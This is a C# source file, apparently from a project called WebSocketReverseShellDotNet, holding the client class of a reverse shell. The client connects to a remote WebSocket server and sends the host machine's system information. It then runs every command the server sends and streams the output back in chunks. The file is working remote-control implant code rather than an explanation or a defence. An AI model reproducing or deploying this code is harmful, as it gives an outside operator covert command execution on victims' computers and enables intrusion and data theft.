using Microsoft.VisualBasic;
using Microsoft.VisualStudio.TestPlatform.Utilities;
using Newtonsoft.Json;
using NUnit.Framework;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.WebSockets;
using System.Text;
using System.Threading.Tasks;
using WebSocketReverseShellDotNet.model;
using WebSocketReverseShellDotNet.service.factory;
using WebSocketReverseShellDotNet.utils;
using Constants = WebSocketReverseShellDotNet.utils.Constants;
namespace WebSocketReverseShellDotNet.service.impl
{
    internal class WebSocketClient
    {

        public static void ConnectToHost()
        {
            Uri uri = new Uri(Constants.SERVER_WEBSOCKET_URI);

            // Use Task.Run to run the asynchronous part in a separate task
            Task.Run(async () =>
            {
                using (ClientWebSocket webSocket = new ClientWebSocket())
                {
                    try
                    {
                        // Connect to the WebSocket server
                        await webSocket.ConnectAsync(uri, CancellationToken.None);
                        byte[] buffer = new byte[1024];

                        // send intial message
                        await SendIntialMessageData(webSocket);

                        // Continue processing as long as the WebSocket connection is open
                        while (isSocketOpen(webSocket))
                        {
                            
                            await OnWebSocketMessage(buffer, webSocket);
                        }
                    }
                    catch (Exception ex)
                    {
                        // Handle exceptions that may occur during the connection process
                        Console.WriteLine($"WebSocket connection failed: {ex.Message}");
                    }
                }
            }).Wait(); // Wait for the asynchronous task to complete
        }

        private static async Task OnWebSocketMessage(byte[] buffer, ClientWebSocket webSocket) {
            WebSocketReceiveResult result = await webSocket.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);

            if (result.MessageType == WebSocketMessageType.Text)
            {
                // Convert received data to a string
                string receivedData = System.Text.Encoding.UTF8.GetString(buffer, 0, result.Count);
                handleIntialMessage(receivedData);

                Console.WriteLine($"Received: {receivedData}");

                await handleServerCommand(receivedData,webSocket);

            }

        }

        static async Task SendData(ClientWebSocket webSocket, string message)
        {
            byte[] buffer = System.Text.Encoding.UTF8.GetBytes(message);
            await webSocket.SendAsync(new ArraySegment<byte>(buffer), WebSocketMessageType.Text, true, CancellationToken.None);
        }

        static async Task SendIntialMessageData(ClientWebSocket webSocket)
        {

            if (isSocketOpen(webSocket))
            {
                ReverseShellInfoInitialMessage reverseShellInfoInitial = OSUtil.GetComputerInfo();
                Console.WriteLine(reverseShellInfoInitial);

                byte[] buffer = System.Text.Encoding.UTF8.GetBytes(reverseShellInfoInitial.ToString());
                await webSocket.SendAsync(new ArraySegment<byte>(buffer), WebSocketMessageType.Text, true, CancellationToken.None);
               
            }

        }

        private static Boolean isSocketOpen(ClientWebSocket webSocket) { 

            return webSocket.State == WebSocketState.Open;
        }

        private static void handleIntialMessage(string receivedData)
        {
            try
            {

                InitialConnectionMessageModel initialConnectionMessage = JsonConvert.DeserializeObject<InitialConnectionMessageModel>(receivedData);
                //Console.WriteLine(initialConnectionMessage.GetSessionId());
                if (initialConnectionMessage != null && initialConnectionMessage.GetSessionId() != null)
                {
                    ReverseShellSession.SessionId = initialConnectionMessage.GetSessionId();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }

        private static async Task handleServerCommand(string receivedData, ClientWebSocket websocket)
        {
            try
            {

                ManagerCommunicationModel managerCommunication = JsonConvert.DeserializeObject<ManagerCommunicationModel>(receivedData);
                //Console.WriteLine(initialConnectionMessage.GetSessionId());
                if (managerCommunication != null && managerCommunication.Msg != null )
                {
                    await executeCommand(managerCommunication, websocket);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }

        }

        private static async Task executeCommand(ManagerCommunicationModel managerCommunication, ClientWebSocket websocket)
        {
            String commandOutput = SystemCommandUtil.RunCommand(managerCommunication.Msg);
            try
            {
                await sendMessageInPatches(commandOutput,  7000, managerCommunication.Uuid, websocket);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }

        }
        private static async Task sendMessageInPatches(String commandResponse, int length, String uuid, ClientWebSocket websocket) 
        {
            List<String> wordsBatch = DataManuplationUtil.SplitString(commandResponse, length);


            foreach (var words in wordsBatch)
            {
                CommandRestOutput commandRestOutput = new CommandRestOutput(words, uuid);
                await SendData(websocket, commandRestOutput.ToString());
            }


}


    }
}
